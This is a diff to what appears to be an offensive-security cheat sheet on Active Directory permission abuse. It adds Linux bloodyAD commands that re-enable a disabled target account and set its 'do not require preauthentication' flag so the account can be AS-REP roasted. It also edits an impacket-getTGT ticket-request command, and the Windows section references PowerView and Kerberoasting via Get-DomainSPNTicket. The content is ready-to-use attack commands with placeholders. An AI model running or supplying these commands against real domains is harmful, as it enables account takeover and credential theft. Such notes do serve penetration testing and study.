@@ -6,8 +6,21 @@ tags: ["Shadow Credentials", "Pass-The-Ticket", "Kerberoasting", "Genericwrite",
 
 ### Abuse #1 : Add UF_DONT_REQUIRE_PREAUTH bit to Target User
 
-{{< tab set1 tab1 >}}Windows{{< /tab >}}
+{{< tab set1 tab1 >}}Linux{{< /tab >}}
+{{< tab set1 tab2 >}}Windows{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
+
+```console
+# Enable Account (if Disabled)
+sudo ntpdate -s <DC_IP> && bloodyAD --host <DC> -d "<DOMAIN>" --dc-ip <DC_IP> -k remove uac <TARGET_USER> -f ACCOUNTDISABLE
+```
+
+```console
+sudo ntpdate -s <DC_IP> && bloodyAD --host <DC> -d "<DOMAIN>" --dc-ip <DC_IP> -k add uac <TARGET_USER> -f DONT_REQ_PREAUTH
+```
+
+{{< /tabcontent >}}
+{{< tabcontent set1 tab2 >}}
 
 #### 1. Import PowerView
 
@@ -143,7 +156,7 @@ Get-DomainSPNTicket -SPN '<SERVICE>/<TARGET_DOMAIN>:<SERVICE_PORT>' -Credential 
 #### 1. Request a ticket
 
 ```console
-sudo ntpdate -s <DC> && impacket-getTGT '<DOMAIN>/<USER>'
+sudo ntpdate -s <DC> && impacket-getTGT '<DOMAIN>/<USER>' -dc-ip <DC_IP>
 ```
 
 ```console {class="sample-code"}
